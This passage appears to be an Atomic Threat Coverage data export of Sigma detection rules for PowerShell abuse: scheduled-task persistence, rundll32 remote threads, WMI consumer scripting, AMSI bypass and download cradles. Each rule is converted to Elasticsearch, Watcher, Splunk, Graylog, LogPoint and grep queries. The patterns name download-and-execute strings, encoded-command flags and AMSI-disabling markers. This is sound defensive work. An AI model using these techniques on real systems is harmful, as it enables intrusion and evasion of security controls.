CommandLine.keyword:(*schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *ONLOGON*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *DAILY*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *ONIDLE*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *Updater*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\Powershell.exe) AND CommandLine.keyword:(*schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *ONLOGON*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *DAILY*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *ONIDLE*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *Updater*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Default PowerSploit and Empire Schtasks Persistence\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage:(\"*\\\\\\\\Powershell.exe\") AND CommandLine:(\"*schtasks*\\\\/Create*\\\\/SC *ONLOGON*\\\\/TN *Updater*\\\\/TR *powershell*\" \"*schtasks*\\\\/Create*\\\\/SC *DAILY*\\\\/TN *Updater*\\\\/TR *powershell*\" \"*schtasks*\\\\/Create*\\\\/SC *ONIDLE*\\\\/TN *Updater*\\\\/TR *powershell*\" \"*schtasks*\\\\/Create*\\\\/SC *Updater*\\\\/TN *Updater*\\\\/TR *powershell*\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\Powershell.exe\") (CommandLine=\"*schtasks*/Create*/SC *ONLOGON*/TN *Updater*/TR *powershell*\" OR CommandLine=\"*schtasks*/Create*/SC *DAILY*/TN *Updater*/TR *powershell*\" OR CommandLine=\"*schtasks*/Create*/SC *ONIDLE*/TN *Updater*/TR *powershell*\" OR CommandLine=\"*schtasks*/Create*/SC *Updater*/TN *Updater*/TR *powershell*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(ParentImage IN [\"*\\\\\\\\Powershell.exe\"] CommandLine IN [\"*schtasks*/Create*/SC *ONLOGON*/TN *Updater*/TR *powershell*\", \"*schtasks*/Create*/SC *DAILY*/TN *Updater*/TR *powershell*\", \"*schtasks*/Create*/SC *ONIDLE*/TN *Updater*/TR *powershell*\", \"*schtasks*/Create*/SC *Updater*/TN *Updater*/TR *powershell*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\Powershell\\\\.exe))(?=.*(?:.*.*schtasks.*/Create.*/SC .*ONLOGON.*/TN .*Updater.*/TR .*powershell.*|.*.*schtasks.*/Create.*/SC .*DAILY.*/TN .*Updater.*/TR .*powershell.*|.*.*schtasks.*/Create.*/SC .*ONIDLE.*/TN .*Updater.*/TR .*powershell.*|.*.*schtasks.*/Create.*/SC .*Updater.*/TN .*Updater.*/TR .*powershell.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: PowerShell Rundll32 Remote Thread Creation\nid: 99b97608-3e21-4bfe-8217-2a127c396a0e\nstatus: experimental\ndescription: Detects PowerShell remote thread creation in Rundll32.exe\nauthor: Florian Roth\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html\ndate: 2018/06/25\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 8\n        SourceImage: '*\\powershell.exe'\n        TargetImage: '*\\rundll32.exe'\n    condition: selection\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1085\n    - attack.t1086\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: PowerShell Rundll32 Remote Thread Creation\nid: 99b97608-3e21-4bfe-8217-2a127c396a0e\nstatus: experimental\ndescription: Detects PowerShell remote thread creation in Rundll32.exe\nauthor: Florian Roth\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html\ndate: 2018/06/25\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 8\n        SourceImage: '*\\powershell.exe'\n        TargetImage: '*\\rundll32.exe'\n    condition: selection\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1085\n    - attack.t1086\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"8\" AND SourceImage.keyword:*\\\\\\\\powershell.exe AND TargetImage.keyword:*\\\\\\\\rundll32.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PowerShell-Rundll32-Remote-Thread-Creation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PowerShell Rundll32 Remote Thread Creation\",\\n    \"description\": \"Detects PowerShell remote thread creation in Rundll32.exe\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1085\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"8\\\\\" AND SourceImage.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND TargetImage.keyword:*\\\\\\\\\\\\\\\\rundll32.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"8\\\\\" AND SourceImage.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND TargetImage.keyword:*\\\\\\\\\\\\\\\\rundll32.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PowerShell Rundll32 Remote Thread Creation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"8\" AND SourceImage.keyword:*\\\\\\\\powershell.exe AND TargetImage.keyword:*\\\\\\\\rundll32.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"8\" SourceImage=\"*\\\\\\\\powershell.exe\" TargetImage=\"*\\\\\\\\rundll32.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"8\" SourceImage=\"*\\\\\\\\powershell.exe\" TargetImage=\"*\\\\\\\\rundll32.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*8)(?=.*.*\\\\powershell\\\\.exe)(?=.*.*\\\\rundll32\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Scripting in a WMI Consumer\nid: fe21810c-2a8c-478f-8dd3-5a287fb2a0e0\nstatus: experimental\ndescription: Detects suspicious scripting in WMI Event Consumers\nauthor: Florian Roth\nreferences:\n    - https://in.security/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/\n    - https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar#L19\ndate: 2019/04/15\ntags:\n    - attack.t1086\n    - attack.execution\nlogsource:\n   product: windows\n   service: sysmon\ndetection:\n    selection:\n        EventID: 20\n        Destination:\n            - '*new-object system.net.webclient).downloadstring(*'\n            - '*new-object system.net.webclient).downloadfile(*'\n            - '*new-object net.webclient).downloadstring(*'\n            - '*new-object net.webclient).downloadfile(*'\n            - '* iex(*'\n            - '*WScript.shell*'\n            - '* -nop *'\n            - '* -noprofile *'\n            - '* -decode *'\n            - '* -enc *'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Scripting in a WMI Consumer\nid: fe21810c-2a8c-478f-8dd3-5a287fb2a0e0\nstatus: experimental\ndescription: Detects suspicious scripting in WMI Event Consumers\nauthor: Florian Roth\nreferences:\n    - https://in.security/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/\n    - https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar#L19\ndate: 2019/04/15\ntags:\n    - attack.t1086\n    - attack.execution\nlogsource:\n   product: windows\n   service: sysmon\ndetection:\n    selection:\n        EventID: 20\n        Destination:\n            - '*new-object system.net.webclient).downloadstring(*'\n            - '*new-object system.net.webclient).downloadfile(*'\n            - '*new-object net.webclient).downloadstring(*'\n            - '*new-object net.webclient).downloadfile(*'\n            - '* iex(*'\n            - '*WScript.shell*'\n            - '* -nop *'\n            - '* -noprofile *'\n            - '* -decode *'\n            - '* -enc *'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"20\" AND Destination.keyword:(*new\\\\-object\\\\ system.net.webclient\\\\).downloadstring\\\\(* OR *new\\\\-object\\\\ system.net.webclient\\\\).downloadfile\\\\(* OR *new\\\\-object\\\\ net.webclient\\\\).downloadstring\\\\(* OR *new\\\\-object\\\\ net.webclient\\\\).downloadfile\\\\(* OR *\\\\ iex\\\\(* OR *WScript.shell* OR *\\\\ \\\\-nop\\\\ * OR *\\\\ \\\\-noprofile\\\\ * OR *\\\\ \\\\-decode\\\\ * OR *\\\\ \\\\-enc\\\\ *))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Scripting-in-a-WMI-Consumer <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Scripting in a WMI Consumer\",\\n    \"description\": \"Detects suspicious scripting in WMI Event Consumers\",\\n    \"tags\": [\\n      \"attack.t1086\",\\n      \"attack.execution\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"20\\\\\" AND Destination.keyword:(*new\\\\\\\\-object\\\\\\\\ system.net.webclient\\\\\\\\).downloadstring\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ system.net.webclient\\\\\\\\).downloadfile\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ net.webclient\\\\\\\\).downloadstring\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ net.webclient\\\\\\\\).downloadfile\\\\\\\\(* OR *\\\\\\\\ iex\\\\\\\\(* OR *WScript.shell* OR *\\\\\\\\ \\\\\\\\-nop\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-noprofile\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-decode\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ *))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"20\\\\\" AND Destination.keyword:(*new\\\\\\\\-object\\\\\\\\ system.net.webclient\\\\\\\\).downloadstring\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ system.net.webclient\\\\\\\\).downloadfile\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ net.webclient\\\\\\\\).downloadstring\\\\\\\\(* OR *new\\\\\\\\-object\\\\\\\\ net.webclient\\\\\\\\).downloadfile\\\\\\\\(* OR *\\\\\\\\ iex\\\\\\\\(* OR *WScript.shell* OR *\\\\\\\\ \\\\\\\\-nop\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-noprofile\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-decode\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-enc\\\\\\\\ *))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Scripting in a WMI Consumer\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"20\" AND Destination.keyword:(*new\\\\-object system.net.webclient\\\\).downloadstring\\\\(* *new\\\\-object system.net.webclient\\\\).downloadfile\\\\(* *new\\\\-object net.webclient\\\\).downloadstring\\\\(* *new\\\\-object net.webclient\\\\).downloadfile\\\\(* * iex\\\\(* *WScript.shell* * \\\\-nop * * \\\\-noprofile * * \\\\-decode * * \\\\-enc *))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"20\" (Destination=\"*new-object system.net.webclient).downloadstring(*\" OR Destination=\"*new-object system.net.webclient).downloadfile(*\" OR Destination=\"*new-object net.webclient).downloadstring(*\" OR Destination=\"*new-object net.webclient).downloadfile(*\" OR Destination=\"* iex(*\" OR Destination=\"*WScript.shell*\" OR Destination=\"* -nop *\" OR Destination=\"* -noprofile *\" OR Destination=\"* -decode *\" OR Destination=\"* -enc *\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"20\" Destination IN [\"*new-object system.net.webclient).downloadstring(*\", \"*new-object system.net.webclient).downloadfile(*\", \"*new-object net.webclient).downloadstring(*\", \"*new-object net.webclient).downloadfile(*\", \"* iex(*\", \"*WScript.shell*\", \"* -nop *\", \"* -noprofile *\", \"* -decode *\", \"* -enc *\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*20)(?=.*(?:.*.*new-object system\\\\.net\\\\.webclient\\\\)\\\\.downloadstring\\\\(.*|.*.*new-object system\\\\.net\\\\.webclient\\\\)\\\\.downloadfile\\\\(.*|.*.*new-object net\\\\.webclient\\\\)\\\\.downloadstring\\\\(.*|.*.*new-object net\\\\.webclient\\\\)\\\\.downloadfile\\\\(.*|.*.* iex\\\\(.*|.*.*WScript\\\\.shell.*|.*.* -nop .*|.*.* -noprofile .*|.*.* -decode .*|.*.* -enc .*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Powershell AMSI Bypass via .NET Reflection\nid: 30edb182-aa75-42c0-b0a9-e998bb29067c\nstatus: experimental\ndescription: Detects Request to amsiInitFailed that can be used to disable AMSI Scanning\nreferences:\n    - https://twitter.com/mattifestation/status/735261176745988096\n    - https://www.hybrid-analysis.com/sample/0ced17419e01663a0cd836c9c2eb925e3031ffb5b18ccf35f4dea5d586d0203e?environmentId=120\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1086\nauthor: Markus Neis\ndate: 2018/08/17\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine:\n            - '*System.Management.Automation.AmsiUtils*'\n    selection2:\n        CommandLine:\n            - '*amsiInitFailed*'\n    condition: selection1 and selection2\n    falsepositives:\n        - Potential Admin Activity\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Powershell AMSI Bypass via .NET Reflection\nid: 30edb182-aa75-42c0-b0a9-e998bb29067c\nstatus: experimental\ndescription: Detects Request to amsiInitFailed that can be used to disable AMSI Scanning\nreferences:\n    - https://twitter.com/mattifestation/status/735261176745988096\n    - https://www.hybrid-analysis.com/sample/0ced17419e01663a0cd836c9c2eb925e3031ffb5b18ccf35f4dea5d586d0203e?environmentId=120\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1086\nauthor: Markus Neis\ndate: 2018/08/17\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine:\n            - '*System.Management.Automation.AmsiUtils*'\n    selection2:\n        CommandLine:\n            - '*amsiInitFailed*'\n    condition: selection1 and selection2\n    falsepositives:\n        - Potential Admin Activity\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:(*System.Management.Automation.AmsiUtils*) AND CommandLine.keyword:(*amsiInitFailed*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Powershell-AMSI-Bypass-via-.NET-Reflection <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Powershell AMSI Bypass via .NET Reflection\",\\n    \"description\": \"Detects Request to amsiInitFailed that can be used to disable AMSI Scanning\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:(*System.Management.Automation.AmsiUtils*) AND CommandLine.keyword:(*amsiInitFailed*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:(*System.Management.Automation.AmsiUtils*) AND CommandLine.keyword:(*amsiInitFailed*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Powershell AMSI Bypass via .NET Reflection\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:(*System.Management.Automation.AmsiUtils*) AND CommandLine.keyword:(*amsiInitFailed*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((CommandLine=\"*System.Management.Automation.AmsiUtils*\") (CommandLine=\"*amsiInitFailed*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*System.Management.Automation.AmsiUtils*\"] CommandLine IN [\"*amsiInitFailed*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*System\\\\.Management\\\\.Automation\\\\.AmsiUtils.*))(?=.*(?:.*.*amsiInitFailed.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Detection of PowerShell Execution via DLL\nid: 6812a10b-60ea-420c-832f-dfcc33b646ba\nstatus: experimental\ndescription: Detects PowerShell Strings applied to rundllas seen in PowerShdll.dll\nreferences:\n    - https://github.com/p3nt4/PowerShdll/blob/master/README.md\ntags:\n    - attack.execution\n    - attack.t1086\n    - car.2014-04-003\nauthor: Markus Neis\ndate: 2018/08/25\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image:\n            - '*\\rundll32.exe'\n    selection2:\n        Description:\n            - '*Windows-Hostprozess (Rundll32)*'\n    selection3:\n        CommandLine:\n            - '*Default.GetString*'\n            - '*FromBase64String*'\n    condition: (selection1 or selection2) and selection3\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Detection of PowerShell Execution via DLL\nid: 6812a10b-60ea-420c-832f-dfcc33b646ba\nstatus: experimental\ndescription: Detects PowerShell Strings applied to rundllas seen in PowerShdll.dll\nreferences:\n    - https://github.com/p3nt4/PowerShdll/blob/master/README.md\ntags:\n    - attack.execution\n    - attack.t1086\n    - car.2014-04-003\nauthor: Markus Neis\ndate: 2018/08/25\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image:\n            - '*\\rundll32.exe'\n    selection2:\n        Description:\n            - '*Windows-Hostprozess (Rundll32)*'\n    selection3:\n        CommandLine:\n            - '*Default.GetString*'\n            - '*FromBase64String*'\n    condition: (selection1 or selection2) and selection3\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:(*\\\\\\\\rundll32.exe) OR Description.keyword:(*Windows\\\\-Hostprozess\\\\ \\\\(Rundll32\\\\)*)) AND CommandLine.keyword:(*Default.GetString* OR *FromBase64String*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Detection-of-PowerShell-Execution-via-DLL <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Detection of PowerShell Execution via DLL\",\\n    \"description\": \"Detects PowerShell Strings applied to rundllas seen in PowerShdll.dll\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\",\\n      \"car.2014-04-003\"\\n    ],\\n    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\rundll32.exe) OR Description.keyword:(*Windows\\\\\\\\-Hostprozess\\\\\\\\ \\\\\\\\(Rundll32\\\\\\\\)*)) AND CommandLine.keyword:(*Default.GetString* OR *FromBase64String*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\rundll32.exe) OR Description.keyword:(*Windows\\\\\\\\-Hostprozess\\\\\\\\ \\\\\\\\(Rundll32\\\\\\\\)*)) AND CommandLine.keyword:(*Default.GetString* OR *FromBase64String*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Detection of PowerShell Execution via DLL\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:(*\\\\\\\\rundll32.exe) OR Description.keyword:(*Windows\\\\-Hostprozess \\\\(Rundll32\\\\)*)) AND CommandLine.keyword:(*Default.GetString* *FromBase64String*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((Image=\"*\\\\\\\\rundll32.exe\") OR (Description=\"*Windows-Hostprozess (Rundll32)*\")) (CommandLine=\"*Default.GetString*\" OR CommandLine=\"*FromBase64String*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image IN [\"*\\\\\\\\rundll32.exe\"] OR Description IN [\"*Windows-Hostprozess (Rundll32)*\"]) CommandLine IN [\"*Default.GetString*\", \"*FromBase64String*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?:.*(?:.*.*\\\\rundll32\\\\.exe)|.*(?:.*.*Windows-Hostprozess \\\\(Rundll32\\\\).*))))(?=.*(?:.*.*Default\\\\.GetString.*|.*.*FromBase64String.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: PowerShell Download from URL\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nstatus: experimental\ndescription: Detects a Powershell process that contains download commands in its command line string\nauthor: Florian Roth\ntags:\n    - attack.t1086\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\powershell.exe'\n        CommandLine:\n            - '*new-object system.net.webclient).downloadstring(*'\n            - '*new-object system.net.webclient).downloadfile(*'\n            - '*new-object net.webclient).downloadstring(*'\n            - '*new-object net.webclient).downloadfile(*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: PowerShell Download from URL\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nstatus: experimental\ndescription: Detects a Powershell process that contains download commands in its command line string\nauthor: Florian Roth\ntags:\n    - attack.t1086\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\powershell.exe'\n        CommandLine:\n            - '*new-object system.net.webclient).downloadstring(*'\n            - '*new-object system.net.webclient).downloadfile(*'\n            - '*new-object net.webclient).downloadstring(*'\n            - '*new-object net.webclient).downloadfile(*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:(*new\\\\-object\\\\ system.net.webclient\\\\).downloadstring\\\\(* OR *new\\\\-object\\\\ 